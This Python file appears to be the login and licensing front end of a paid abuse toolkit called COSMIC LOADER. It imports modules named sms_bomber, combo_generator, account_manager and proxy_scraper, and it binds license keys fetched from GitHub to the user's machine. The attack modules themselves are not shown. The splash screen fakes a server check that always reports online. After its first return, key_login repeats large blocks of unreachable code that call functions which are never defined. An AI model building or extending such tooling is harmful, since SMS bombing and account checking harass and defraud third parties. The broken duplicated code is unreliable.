import base64
import hashlib
import html
import io
import json
import logging
import os
import queue
import random
import re
import shutil
import signal
import socket
import sys
import threading
import time
import urllib.parse
import uuid
import secrets
import platform
import uuid as _uuid
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Event, Lock, Thread
from typing import Any, Dict, List, Optional, Tuple
import colorama
import requests
from colorama import Fore as _F
from colorama import Style as _S
from Crypto.Cipher import AES
from rich import box
from rich import print as rprint
from rich.align import Align
from rich.box import DOUBLE, HEAVY, ROUNDED, Box
from rich.columns import Columns
from rich.console import Console, Group
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.progress import (BarColumn, MofNCompleteColumn, Progress,
                           SpinnerColumn, TextColumn, TimeElapsedColumn,
                           TimeRemainingColumn)
from rich.prompt import Confirm
from rich.rule import Rule
from rich.table import Table
from rich.text import Text

# ── Decoder + Encoder Module ──────────────────────────────────
try:
    import decoder_encoder as _dec_enc
    _DEC_ENC_AVAILABLE = True
except Exception as _e:
    _DEC_ENC_AVAILABLE = False
    _DEC_ENC_ERROR = str(_e)

# ── URL Remover Module ────────────────────────────────────────
try:
    import url_remover as _url_rm
    _URL_RM_AVAILABLE = True
except Exception as _e:
    _URL_RM_AVAILABLE = False
    _URL_RM_ERROR = str(_e)


# ── Thread Manager Module ──────────────────────────────────────
try:
    import thread_manager as _thread_mgr
    _THREAD_MGR_AVAILABLE = True
except Exception as _e:
    _THREAD_MGR_AVAILABLE = False

# ── Combo Generator Module ─────────────────────────────────────
try:
    import combo_generator as _combo_gen
    _COMBO_GEN_AVAILABLE = True
except Exception as _e:
    _COMBO_GEN_AVAILABLE = False

# ── Account Manager Module ─────────────────────────────────────
try:
    import account_manager as _acc_mgr
    _ACC_MGR_AVAILABLE = True
except Exception as _e:
    _ACC_MGR_AVAILABLE = False

# ── Tracking Module (anti-leak, suspend) ──────────────────────
try:
    import tracking as _tracking
    _TRACKING_AVAILABLE = True
except Exception as _e:
    _TRACKING_AVAILABLE = False
    _TRACKING_ERROR = str(_e)

# ── Security Module (integrity + anti-tamper) ─────────────────
try:
    import security as _security
    _SECURITY_AVAILABLE = True
except SystemExit:
    raise
except Exception as _e:
    _SECURITY_AVAILABLE = False
    _SECURITY_ERROR = str(_e)

# ── Auto-Updater Module ───────────────────────────────────────
try:
    import updater as _updater
    _UPDATER_AVAILABLE = True
except Exception as _e:
    _UPDATER_AVAILABLE = False
    _UPDATER_ERROR = str(_e)

# ── Separator Module ──────────────────────────────────────────
try:
    import separator as _separator
    _SEPARATOR_AVAILABLE = True
except Exception as _e:
    _SEPARATOR_AVAILABLE = False
    _SEPARATOR_ERROR = str(_e)

# ── SMS Bomber Module ─────────────────────────────────────────
try:
    import sms_bomber as _sms_bomber
    _SMS_BOMBER_AVAILABLE = True
except Exception as _e:
    _SMS_BOMBER_AVAILABLE = False
    _SMS_BOMBER_ERROR = str(_e)

# ── Proxy Scraper Module ──────────────────────────────────────
try:
    import proxy_scraper as _proxy_scraper
    _PROXY_SCRAPER_AVAILABLE = True
except Exception as _e:
    _PROXY_SCRAPER_AVAILABLE = False
    _PROXY_SCRAPER_ERROR = str(_e)

try:
    import pyfiglet as _pyfiglet
    _HAS_FIG = True
except ImportError:
    _HAS_FIG = False

colorama.init(autoreset=True)

# ── Gradient colour helpers (24-bit ANSI) ─────────────────────────────────────
def _grad_char(ch, r1, g1, b1, r2, g2, b2, t):
    r = int(r1 + (r2 - r1) * t)
    g = int(g1 + (g2 - g1) * t)
    b = int(b1 + (b2 - b1) * t)
    return f'\033[38;2;{r};{g};{b}m{ch}\033[0m'

def _grad_str(text, r1=180, g1=0, b1=255, r2=255, g2=80, b2=200):
    n = max(len(text) - 1, 1)
    return ''.join(_grad_char(ch, r1, g1, b1, r2, g2, b2, i / n) for i, ch in enumerate(text))

# ── COSMIC CYAN GRADIENT HELPERS ─────────────────────────────────
_GRAD_VER = '\033[38;2;0;229;255m'
_GRAD_BY  = '\033[38;2;120;230;255m'
_GRAD_AT  = '\033[38;2;180;240;255m'

# ── COSMIC CYAN / LIGHT BLUE PALETTE ─────────────────────────────
_A_PRIMARY   = "\033[38;2;0;229;255m"      # bright cyan (main)
_A_ACCENT    = "\033[38;2;120;230;255m"    # light sky blue
_A_SOFT      = "\033[38;2;180;240;255m"    # very light cyan
_A_DEEP      = "\033[38;2;0;150;200m"      # deep blue
_A_BRIGHT    = "\033[38;2;100;255;255m"    # electric cyan
_A_SUCCESS   = "\033[38;2;100;255;180m"    # mint green
_A_WARNING   = "\033[38;2;255;200;100m"    # soft amber
_A_ERROR     = "\033[38;2;255;100;120m"    # soft red
_A_DIM       = "\033[38;2;90;120;140m"     # muted blue-gray
_A_WHITE     = "\033[38;2;230;240;255m"    # soft white-blue
_A_BOLD      = "\033[1m"
_A_RST       = "\033[0m"

# Aliases (keep old code working)
_A_MAGENTA = _A_PRIMARY
_A_YELLOW  = _A_BRIGHT
_A_RED     = _A_ERROR
_A_CYAN    = _A_ACCENT
_A_GREEN   = _A_SUCCESS
_A_ORANGE  = _A_WARNING
_A_PURPLE  = _A_SOFT

# ══════════════════════════════════════════════════════════════════════════
#  DEV ID CHECKER — Optional Module Integration
# ══════════════════════════════════════════════════════════════════════════
_DEV_ID_CHECKER_AVAILABLE = False
try:
    import Dev_Id_checker as _devid
    _DEV_ID_CHECKER_AVAILABLE = True
except Exception as _e:
    _DEV_ID_CHECKER_AVAILABLE = False
    _DEV_ID_IMPORT_ERROR = str(_e)

# # # ══════════════════════════════════════════════════════════════════════════
#  COSMIC KEY SYSTEM — Storage + Validation
# ══════════════════════════════════════════════════════════════════════════

# CLOUD KEYS (source of truth)
CLOUD_KEYS_URL = "https://api.github.com/repos/laranaswalangbitaw-lgtm/cosmic-loader-updates/contents/files/keys.json"

# LOCAL CACHE
KEYS_FILE_PATH = Path("/storage/emulated/0/COSMIC-LOADER-v4.0/keys.json")
USER_SESSION_PATH = Path("/storage/emulated/0/COSMIC-LOADER-v4.0/.user_session")
_USER_KEY_SESSION = {"key": None, "expires_at": None, "uses": 0, "username": None}


def _fetch_cloud_keys():
    """Download keys from GitHub API (fresh, no cache)."""
    try:
        import requests
        import base64
        import json as _json
        
        # Try API first
        r = requests.get(CLOUD_KEYS_URL, timeout=10, headers={
            "Accept": "application/vnd.github.v3+json"
        })
        if r.status_code == 200:
            api_data = r.json()
            if "content" in api_data:
                content_b64 = api_data["content"].replace("\n", "")
                content = base64.b64decode(content_b64).decode("utf-8")
                data = _json.loads(content)
                
                # Save local cache
                try:
                    KEYS_FILE_PATH.parent.mkdir(parents=True, exist_ok=True)
                    KEYS_FILE_PATH.write_text(content)
                except Exception:
                    pass
                
                return data
        
        # Fallback sa raw URL
        raw_url = "https://raw.githubusercontent.com/laranaswalangbitaw-lgtm/cosmic-loader-updates/main/files/keys.json"
        r2 = requests.get(raw_url, timeout=10)
        if r2.status_code == 200:
            data2 = r2.json()
            if "keys" in data2 and data2["keys"]:
                return data2
    except Exception as e:
        pass



def _keys_load() -> dict:
    """Load keys — CLOUD FIRST (source of truth)."""
    # Try cloud first
    cloud_data = _fetch_cloud_keys()
    if cloud_data and cloud_data.get("keys"):
        return cloud_data
    
    # Fallback to local cache
    if not KEYS_FILE_PATH.exists():
        return {"keys": {}}
    try:
        with open(KEYS_FILE_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {"keys": {}}


def _keys_save(d: dict) -> bool:
    try:
        with _KEY_LOCK:
            with open(KEYS_FILE_PATH, "w", encoding="utf-8") as f:
                json.dump(d, f, indent=2)
        try:
            os.chmod(KEYS_FILE_PATH, 0o600)
        except Exception:
            pass
        return True
    except Exception:
        return False


def _validate_key_str(key_str: str, allow_rebind: bool = False) -> tuple:
    data = _keys_load()
    rec = data["keys"].get(key_str.strip().upper())
    if not rec:
        return False, "Invalid key.", None
    if rec.get("revoked"):
        return False, "This key has been revoked.", rec
    exp = rec.get("expires_at")
    if exp:
        try:
            if datetime.fromisoformat(exp) < datetime.now():
                return False, "This key has expired.", rec
        except Exception:
            pass
    bound = rec.get("bound_to")
    if bound and not allow_rebind:
        try:
            if socket.gethostname() != bound:
                return False, "This key is locked to another machine.", rec
        except Exception:
            pass
    return True, "OK", rec


def _consume_key_str(key_str: str):
    data = _keys_load()
    k = key_str.strip().upper()
    rec = data["keys"].get(k)
    if not rec:
        return
    rec["uses"] = rec.get("uses", 0) + 1
    if not rec.get("bound_to"):
        try:
            rec["bound_to"] = socket.gethostname()
        except Exception:
            rec["bound_to"] = "unknown"
        rec["bound_at"] = datetime.now().isoformat()
    data["keys"][k] = rec
    _keys_save(data)


def _fmt_remain_key(ea) -> str:
    if not ea:
        return "Never"
    try:
        dt = datetime.fromisoformat(ea)
        d = dt - datetime.now()
        if d.total_seconds() <= 0:
            return "Expired"
        days, h, m = d.days, d.seconds // 3600, (d.seconds % 3600) // 60
        if days > 0:
            return f"{days}d {h}h"
        if h > 0:
            return f"{h}h {m}m"
        return f"{m}m"
    except Exception:
        return "?"


def _session_save(key_str: str, rec: dict):
    try:
        with open(USER_SESSION_PATH, "w", encoding="utf-8") as f:
            json.dump({"key": key_str, "bound_to": rec.get("bound_to")}, f)
        try:
            os.chmod(USER_SESSION_PATH, 0o600)
        except Exception:
            pass
    except Exception:
        pass


def _session_load() -> dict:
    if not USER_SESSION_PATH.exists():
        return {}
    try:
        with open(USER_SESSION_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _session_clear():
    try:
        if USER_SESSION_PATH.exists():
            USER_SESSION_PATH.unlink()
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════
#  COSMIC KEY SYNC — compatible with admin bot
# ══════════════════════════════════════════════════════════════════════════
AUDIT_LOG_PATH = Path("audit.log")
BACKUP_DIR = Path("backups")


def _audit(action: str, detail: str = ""):
    """Log user actions (same format as admin bot)."""
    try:
        with open(AUDIT_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat()}] {_USER_KEY_SESSION.get('username', 'anon')} | {action} | {detail}\n")
    except Exception:
        pass


def _auto_cleanup_expired_keys() -> int:
    """Remove expired keys with 0 uses (same as bot's cleanup_expired)."""
    try:
        data = _keys_load()
        now = datetime.now()
        to_delete = []
        for k, r in data.get("keys", {}).items():
            if r.get("expires_at"):
                try:
                    if datetime.fromisoformat(r["expires_at"]) < now:
                        if r.get("revoked") or r.get("uses", 0) == 0:
                            to_delete.append(k)
                except Exception:
                    pass
        for k in to_delete:
            del data["keys"][k]
        if to_delete:
            _keys_save(data)
            print(f"  {_A_DIM}🧹 Auto-cleanup: removed {len(to_delete)} expired key(s){_A_RST}")
        return len(to_delete)
    except Exception:
        return 0


def _backup_keys() -> str:
    """Backup keys.json + .user_session to backups/ folder."""
    try:
        BACKUP_DIR.mkdir(exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = BACKUP_DIR / f"loader_backup_{ts}.json"
        backup_data = {
            "keys": _keys_load(),
            "session": _session_load(),
            "timestamp": datetime.now().isoformat(),
        }
        with open(backup_file, "w", encoding="utf-8") as f:
            json.dump(backup_data, f, indent=2)
        return str(backup_file)
    except Exception as e:
        return f"error: {e}"


def _key_status_check(key_str: str) -> tuple:
    """Check if key is revoked/expired (compatible with bot keys)."""
    data = _keys_load()
    rec = data.get("keys", {}).get(key_str.strip().upper())
    if not rec:
        return False, "not_found"
    if rec.get("revoked"):
        return False, "revoked"
    if rec.get("expires_at"):
        try:
            if datetime.fromisoformat(rec["expires_at"]) < datetime.now():
                return False, "expired"
        except Exception:
            pass
    return True, "ok"

# ══════════════════════════════════════════════════════════════════════════
#  UTILITY — Screen clear + Banner (Cosmic Cyan Edition)
# ══════════════════════════════════════════════════════════════════════════
def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()


# # ══════════════════════════════════════════════════════════════════════════
#  COSMIC LOADER — Rainbow Banner + Info Panels
# ══════════════════════════════════════════════════════════════════════════

_RAINBOW = [
    "\033[38;5;213m", "\033[38;5;207m", "\033[38;5;171m",
    "\033[38;5;105m", "\033[38;5;75m",  "\033[38;5;45m",
    "\033[38;5;51m",  "\033[38;5;50m",  "\033[38;5;49m",
    "\033[38;5;48m",  "\033[38;5;47m",  "\033[38;5;46m",
]
_RST = "\033[0m"

# Light-blue & blue palette for info panels
_C_LIGHT_BLUE = "\033[38;2;150;220;255m"
_C_BLUE       = "\033[38;2;80;170;255m"
_C_DEEP_BLUE  = "\033[38;2;40;110;200m"
_C_GREEN      = "\033[38;2;100;255;140m"
_C_RED        = "\033[38;2;255;90;110m"
_C_WHITE      = "\033[38;2;240;248;255m"
_C_DIM        = "\033[38;2;120;150;180m"
_C_BOLD       = "\033[1m"


def _rainbow_text(text: str, colors: list = None) -> str:
    if colors is None:
        colors = _RAINBOW
    n = len(colors)
    out = []
    for i, row in enumerate(text.split("\n")):
        out.append(f"{colors[i % n]}{row}{_RST}")
    return "\n".join(out)


# Chunky block font (COSMIC LOADER)
_BIG_FONT = {
    "C": ["██████", "██    ", "██    ", "██    ", "██    ", "██    ", "██████"],
    "O": ["██████", "██  ██", "██  ██", "██  ██", "██  ██", "██  ██", "██████"],
    "S": ["██████", "██    ", "██    ", "██████", "    ██", "    ██", "██████"],
    "M": ["██  ██", "██████", "██████", "██  ██", "██  ██", "██  ██", "██  ██"],
    "I": ["██████", "  ██  ", "  ██  ", "  ██  ", "  ██  ", "  ██  ", "██████"],
    "L": ["██    ", "██    ", "██    ", "██    ", "██    ", "██    ", "██████"],
    "A": ["██████", "██  ██", "██  ██", "██████", "██  ██", "██  ██", "██  ██"],
    "D": ["████  ", "██ ██ ", "██  ██", "██  ██", "██  ██", "██ ██ ", "████  "],
    "E": ["██████", "██    ", "██    ", "████  ", "██    ", "██    ", "██████"],
    "R": ["█████ ", "██  ██", "██  ██", "█████ ", "██ ██ ", "██  ██", "██  ██"],
    " ": ["      ", "      ", "      ", "      ", "      ", "      ", "      "],
}


def _render_big(text: str) -> str:
    rows = [""] * 7
    for ch in text.upper():
        g = _BIG_FONT.get(ch, _BIG_FONT[" "])
        for i in range(7):
            rows[i] += g[i] + "  "
    return "\n".join(rows)


# ── Box helpers (visible-width aware) ─────────────────────────────
def _vlen(s: str) -> int:
    return len(re.sub(r"\x1b\[[0-9;]*m", "", s))


def _box_top(title: str, width: int, color: str) -> str:
    inner = f" {title} "
    left = "─" * 3
    right = "─" * max(width - len(inner) - len(left) - 2, 0)
    return f"  {color}╭{left}{_C_BOLD}{inner}{_RST}{color}{right}╮{_RST}"


def _box_bot(width: int, color: str) -> str:
    return f"  {color}╰{'─' * (width - 2)}╯{_RST}"


def _box_line(content: str, width: int, color: str) -> str:
    pad = width - _vlen(content) - 3
    return f"  {color}│{_RST} {content}{' ' * max(pad, 0)} {color}│{_RST}"


# ── Info panels ───────────────────────────────────────────────────
def _panel_developer(width: int = 82):
    """Light-blue developer credit box."""
    c = _C_LIGHT_BLUE
    title = "🚀 Developed by @LEGITCosmicDev2nd x @LEGITCosmicDev"
    line1 = f"{_C_WHITE}{_C_BOLD}⚡ WELCOME TO COSMIC LOADER ⚡{_RST}"

    print(f"  {c}┏{'━' * 2} {_C_BOLD}{title}{_RST}{c} {'━' * 2}┓{_RST}")
    print(_box_line(line1.center(width - 6), width, c))
    print(_box_line("", width, c))
    feat = f"{_C_DIM}🔒 Secure  {c}|{_RST}  {_C_GREEN}✅ Verified{_RST}  {c}|{_RST}  {_C_WHITE}⚡ Fast{_RST}  {c}|{_RST}  {_C_LIGHT_BLUE}🔐 Encrypted{_RST}"
    print(_box_line(feat.center(width + 18), width, c))
    print(f"  {c}┗{'━' * (width - 2)}┛{_RST}")

# ══════════════════════════════════════════════════════════════════════════
#  COSMIC HARDWARE INFO HELPERS
# ══════════════════════════════════════════════════════════════════════════

def _get_hwid() -> str:
    try:
        mac = _uuid.getnode()
        return f"{mac:012x}"
    except Exception:
        return "unknown"


def _get_local_ip() -> str:
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "127.0.0.1"


def _get_cpu_brand() -> str:
    try:
        return platform.processor() or platform.machine() or "Unknown"
    except Exception:
        return "Unknown"


def _get_cpu_cores() -> int:
    try:
        return os.cpu_count() or 1
    except Exception:
        return 1


def _get_ram_gb() -> float:
    try:
        import psutil
        return round(psutil.virtual_memory().total / (1024 ** 3), 1)
    except Exception:
        pass
    try:
        if os.path.exists("/proc/meminfo"):
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        kb = int(line.split()[1])
                        return round(kb / (1024 ** 2), 1)
    except Exception:
        pass
    return 0.0


def _get_os_name() -> str:
    try:
        return platform.system() or "Unknown"
    except Exception:
        return "Unknown"


def _beep(freq=880, dur=80):
    try:
        import winsound
        winsound.Beep(freq, dur)
    except Exception:
        try:
            sys.stdout.write('\a')
            sys.stdout.flush()
        except Exception:
            pass

def _panel_device(width: int = 82):
    """Blue device information panel (crash-proof)."""
    c = _C_BLUE

    # Safe getters — never raise
    def _safe(fn, default="Unknown"):
        try:
            v = fn()
            return str(v)[:28] if v else default
        except Exception:
            return default

    device  = _safe(lambda: platform.node(), "Unknown")
    os_name = _safe(lambda: f"{platform.system()} {platform.release()}", "Unknown")
    model   = _safe(lambda: platform.machine(), "Unknown")
    dev_id  = _safe(lambda: f"02-{_uuid.uuid4()}", "Unknown")
    hwid    = _safe(_get_hwid, "unknown")

    title = "📱 Device Information"
    print(_box_top(title, width, c))
    print(_box_line(f"💻 {_C_WHITE}Device:{_RST}    {_C_LIGHT_BLUE}{device}{_RST}", width, c))
    print(_box_line(f"🧠 {_C_WHITE}OS:{_RST}        {_C_LIGHT_BLUE}{os_name}{_RST}", width, c))
    print(_box_line(f"🔧 {_C_WHITE}Model:{_RST}     {_C_LIGHT_BLUE}{model}{_RST}", width, c))
    print(_box_line(f"🆔 {_C_WHITE}Device ID:{_RST} {_C_LIGHT_BLUE}{dev_id}{_RST}", width, c))
    print(_box_line(f"🔐 {_C_WHITE}HWID:{_RST}      {_C_LIGHT_BLUE}{hwid}{_RST}", width, c))
    print(_box_bot(width, c))


def _panel_server_status(width: int = 82, ok: bool = True):
    """Green if online, red if offline."""
    c = _C_GREEN if ok else _C_RED
    icon = "✔" if ok else "✖"
    text = "Server is online and ready!" if ok else "Server is offline / unreachable!"
    title = "🌐 Server Status"

    print(_box_top(title, width, c))
    print(_box_line(f"{c}{icon}{_RST} {_C_WHITE}{text}{_RST}", width, c))
    print(_box_bot(width, c))


def _panel_authentication(width: int = 82, ok: bool = True, msg: str = None):
    """Green if authenticated, red if failed."""
    c = _C_GREEN if ok else _C_RED
    icon = "✔" if ok else "✖"
    text = msg or ("Loader authenticated successfully!" if ok else "Authentication failed!")
    title = "🔐 Authentication"

    print(_box_top(title, width, c))
    print(_box_line(f"{c}{icon}{_RST} {_C_WHITE}{text}{_RST}", width, c))
    print(_box_bot(width, c))


def display_banner():
    """Rainbow COSMIC LOADER banner + info panels."""
    try:
        w = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        w = 80
    w = min(w - 4, 82)

    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        sys.stdout.write('\033[2J\033[H')

    # ── Rainbow block banner ──────────────────────────────────────
    top = _render_big("COSMIC")
    bot = _render_big("LOADER")

    print()
    for line in _rainbow_text(top, _RAINBOW[:7]).split("\n"):
        print(f"  {line}")
    for line in _rainbow_text(bot, _RAINBOW[5:12]).split("\n"):
        print(f"  {line}")
    print()

    # ── Light-blue developer box ──────────────────────────────────
    _panel_developer(w)
    print()
    
# ══════════════════════════════════════════════════════════════════════════
#  COSMIC v4.0 LOADER — Animated splash screen (CYAN THEME)
# ══════════════════════════════════════════════════════════════════════════
def _cosmic_loader():
    """Startup splash: banner + device + server + auth header."""
    display_banner()

    # 📱 Device Info
    _panel_device()
    print()

    # 🌐 Server Status
    print(f"  {_C_DIM}⏳ Pinging cosmic server…{_RST}")
    frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(18):
        sys.stdout.write(f"\r  {_C_BLUE}{frames[i % len(frames)]}{_RST}  {_C_DIM}Connecting…{_RST}   ")
        sys.stdout.flush()
        time.sleep(0.045)
    print("\r" + " " * 60 + "\r", end="")
    _panel_server_status(ok=True)
    print()

    # 🔐 Authentication header
    print(f"  {_C_DIM}🔐 Validating loader authentication…{_RST}")
    time.sleep(0.3)


def key_login() -> bool:
    """Cosmic v4.0 key login — same flow as key system."""
    # ─── SILENT SUSPEND CHECK ───
    if _TRACKING_AVAILABLE:
        try:
            suspended, reason = _tracking.is_suspended()
            if suspended:
                # Silent block — no warning shown
                sys.exit(0)
        except Exception:
            pass

    # ─── REGISTER USER ───
    if _TRACKING_AVAILABLE:
        try:
            _tracking.register_user()
        except Exception:
            pass

    # ─── Auto-login from saved session ────────────────────────────
    saved = _session_load()
    if saved.get("key"):
        try:
            machine_ok = saved.get("bound_to") in (None, "", socket.gethostname())
        except Exception:
            machine_ok = True
        if machine_ok:
            ok, _, rec = _validate_key_str(saved["key"], allow_rebind=True)
            if ok:
                _USER_KEY_SESSION.update({
                    "key": saved["key"],
                    "expires_at": rec.get("expires_at"),
                    "uses": rec.get("uses", 0),
                    "username": saved.get("username", "user"),
                })
                # ─── Show banner + device + server + auth ────────
                display_banner()
                _panel_device()
                print()
                _panel_server_status(ok=True)
                print()
                print(f"  {_C_DIM}🔐 Validating loader authentication…{_RST}")
                time.sleep(0.4)

                # Auto-login uses same green/red panel
                _panel_authentication(
                    ok=True,
                    msg=f"AUTO-LOGIN  ·  {saved.get('username', 'user')}"
                )
                print()

                exp_str = _fmt_remain_key(rec.get('expires_at'))
                print(f"  {_C_DIM}Key: {_C_LIGHT_BLUE}{saved['key']}{_RST}")
                print(f"  {_C_DIM}Expires: {_C_GREEN}{exp_str}{_RST}")
                print()
                _beep(1000, 50)
                time.sleep(1.4)
                return True

    # ─── Fresh login: show splash first ───────────────────────────
    _cosmic_loader()

    # ─── Prompt username + key ────────────────────────────────────
    try:
        username = input(f"  {_C_LIGHT_BLUE}❯ Username :{_RST} ").strip()
        if not username:
            username = "anonymous"
        _USER_KEY_SESSION["username"] = username
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    print()

    try:
        key_input = input(f"  {_C_LIGHT_BLUE}❯ License Key :{_RST} ").strip().upper()
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    if not key_input:
        _panel_authentication(ok=False, msg="No key entered.")
        time.sleep(1.5)
        return False

    print()
    # ─── Validating animation ─────────────────────────────────────
    bar_w = 44
    sys.stdout.write("  ")
    for i in range(bar_w):
        idx = int((i / bar_w) * (len(_RAINBOW) - 1))
        sys.stdout.write(f"{_RAINBOW[idx]}█{_RST}")
        sys.stdout.flush()
        time.sleep(0.012)
    print(f"  {_C_GREEN}✔{_RST}")
    time.sleep(0.25)

    # ─── Validate key ─────────────────────────────────────────────
    ok, msg, rec = _validate_key_str(key_input)

    if not ok:
        _beep(300, 200)
        _panel_authentication(ok=False, msg=msg)
        print()
        print(f"  {_C_DIM}Press Enter to exit…{_RST}")
        input()
        return False

    # ─── Consume + save session ───────────────────────────────────
    _consume_key_str(key_input)
    _, _, rec = _validate_key_str(key_input, allow_rebind=True)
    _session_save(key_input, rec)
    _USER_KEY_SESSION.update({
        "key": key_input,
        "expires_at": rec.get("expires_at"),
        "uses": rec.get("uses", 0),
        "username": username,
    })

    _beep(1200, 100)
    print()

    # ─── Success panel ────────────────────────────────────────────
    _panel_authentication(ok=True, msg=f"Loader authenticated! Welcome, {username}")
    print()

    exp_str = _fmt_remain_key(rec.get('expires_at'))
    print(f"  {_C_DIM}Key: {_C_LIGHT_BLUE}{key_input}{_RST}")
    print(f"  {_C_DIM}Expires: {_C_GREEN}{exp_str}{_RST}")

    # ─── Expiry warning ───────────────────────────────────────────
    try:
        if rec.get("expires_at"):
            exp_dt = datetime.fromisoformat(rec["expires_at"])
            hours_left = (exp_dt - datetime.now()).total_seconds() / 3600
            if 0 < hours_left < 24:
                print()
                print(f"  {_A_WARNING}⚠  WARNING: Your key expires in less than 24 hours!{_A_RST}")
                print(f"  {_C_DIM}   Renew soon to keep access to the checker.{_RST}")
    except Exception:
        pass

    time.sleep(1.6)
    return True

    # Show animated loader
    _cosmic_loader()

    _cosmic_header()
    _cosmic_hardware_security()
    _cosmic_bottom_bar()

    print(f"  {_A_PRIMARY}┌{'─' * 68}┐{_A_RST}")
    print(f"  {_A_PRIMARY}│{_A_RST}  {_A_ACCENT}[ {_A_BOLD}COSMIC USER AUTHENTICATION{_A_RST}{_A_ACCENT} ]{_A_RST}"
          f"{' ' * 38}{_A_PRIMARY}│{_A_RST}")
    print(f"  {_A_PRIMARY}└{'─' * 68}┘{_A_RST}")
    print()

    try:
        username = input(f"  {_A_ACCENT}❯ Username :{_A_RST} ").strip()
        if not username:
            username = "anonymous"
        _USER_KEY_SESSION["username"] = username
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    print()

    try:
        key_input = input(f"  {_A_ACCENT}❯ License Key :{_A_RST} ").strip().upper()
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    if not key_input:
        print(f"\n  {_A_ERROR}✖  No key entered.{_A_RST}")
        time.sleep(1.5)
        return False

    print()
    print(f"  {_A_DIM}Verifying…{_A_RST}")
    time.sleep(0.5)

    ok, msg, rec = _validate_key_str(key_input)
    if not ok:
        _beep(300, 200)
        print(f"\n  {_A_ERROR}✖  {msg}{_A_RST}")
        print(f"  {_A_DIM}Press Enter to exit…{_A_RST}")
        input()
        return False

    _consume_key_str(key_input)
    _, _, rec = _validate_key_str(key_input, allow_rebind=True)
    _session_save(key_input, rec)
    _USER_KEY_SESSION.update({
        "key": key_input,
        "expires_at": rec.get("expires_at"),
        "uses": rec.get("uses", 0),
        "username": username,
    })

    _beep(1200, 100)
    _audit("login_success", f"key={key_input[:20]}...")

    print()
    print(f"  {_A_SUCCESS}[ {_A_BOLD}ACCESS GRANTED{_A_RST}{_A_SUCCESS} ]{_A_RST}  "
          f"{_A_ACCENT}Welcome, {_A_BRIGHT}{username}{_A_RST}")
    print(f"  {_A_DIM}Key: {_A_BRIGHT}{key_input}{_A_RST}")
    exp_str = _fmt_remain_key(rec.get('expires_at'))
    print(f"  {_A_DIM}Expires: {_A_ACCENT}{exp_str}{_A_RST}")

    try:
        if rec.get("expires_at"):
            exp_dt = datetime.fromisoformat(rec["expires_at"])
            hours_left = (exp_dt - datetime.now()).total_seconds() / 3600
            if 0 < hours_left < 24:
                print()
                print(f"  {_A_WARNING}⚠  WARNING: Your key expires in less than 24 hours!{_A_RST}")
                print(f"  {_A_DIM}   Renew soon to keep access to the checker.{_A_RST}")
    except Exception:
        pass

    time.sleep(1.8)
    return True

    # Show animated loader
    _cosmic_loader()

    _cosmic_header()
    _cosmic_hardware_security()
    _cosmic_bottom_bar()

    print(f"  {_A_PRIMARY}┌{'─' * 68}┐{_A_RST}")
    print(f"  {_A_PRIMARY}│{_A_RST}  {_A_ACCENT}[ {_A_BOLD}COSMIC USER AUTHENTICATION{_A_RST}{_A_ACCENT} ]{_A_RST}"
          f"{' ' * 38}{_A_PRIMARY}│{_A_RST}")
    print(f"  {_A_PRIMARY}└{'─' * 68}┘{_A_RST}")
    print()

    try:
        username = input(f"  {_A_ACCENT}❯ Username :{_A_RST} ").strip()
        if not username:
            username = "anonymous"
        _USER_KEY_SESSION["username"] = username
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    print()

    try:
        key_input = input(f"  {_A_ACCENT}❯ License Key :{_A_RST} ").strip().upper()
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    if not key_input:
        print(f"\n  {_A_ERROR}✖  No key entered.{_A_RST}")
        time.sleep(1.5)
        return False

    print()
    print(f"  {_A_DIM}Verifying…{_A_RST}")
    time.sleep(0.5)

    ok, msg, rec = _validate_key_str(key_input)
    if not ok:
        _beep(300, 200)
        print(f"\n  {_A_ERROR}✖  {msg}{_A_RST}")
        print(f"  {_A_DIM}Press Enter to exit…{_A_RST}")
        input()
        return False

    _consume_key_str(key_input)
    _, _, rec = _validate_key_str(key_input, allow_rebind=True)
    _session_save(key_input, rec)
    _USER_KEY_SESSION.update({
        "key": key_input,
        "expires_at": rec.get("expires_at"),
        "uses": rec.get("uses", 0),
        "username": username,
    })

    _beep(1200, 100)

    print()
    print(f"  {_A_SUCCESS}[ {_A_BOLD}ACCESS GRANTED{_A_RST}{_A_SUCCESS} ]{_A_RST}  "
          f"{_A_ACCENT}Welcome, {_A_BRIGHT}{username}{_A_RST}")
    print(f"  {_A_DIM}Key: {_A_BRIGHT}{key_input}{_A_RST}")
    exp_str = _fmt_remain_key(rec.get('expires_at'))
    print(f"  {_A_DIM}Expires: {_A_ACCENT}{exp_str}{_A_RST}")

    try:
        if rec.get("expires_at"):
            exp_dt = datetime.fromisoformat(rec["expires_at"])
            hours_left = (exp_dt - datetime.now()).total_seconds() / 3600
            if 0 < hours_left < 24:
                print()
                print(f"  {_A_WARNING}⚠  WARNING: Your key expires in less than 24 hours!{_A_RST}")
                print(f"  {_A_DIM}   Renew soon to keep access to the checker.{_A_RST}")
    except Exception:
        pass

    time.sleep(1.8)
    return True

    # Prompt for key
    _cosmic_header()
    _cosmic_hardware_security()
    _cosmic_bottom_bar()

    # Username prompt (ACHI style)
    print(f"  {_A_MAGENTA}┌{'─' * 68}┐{_A_RST}")
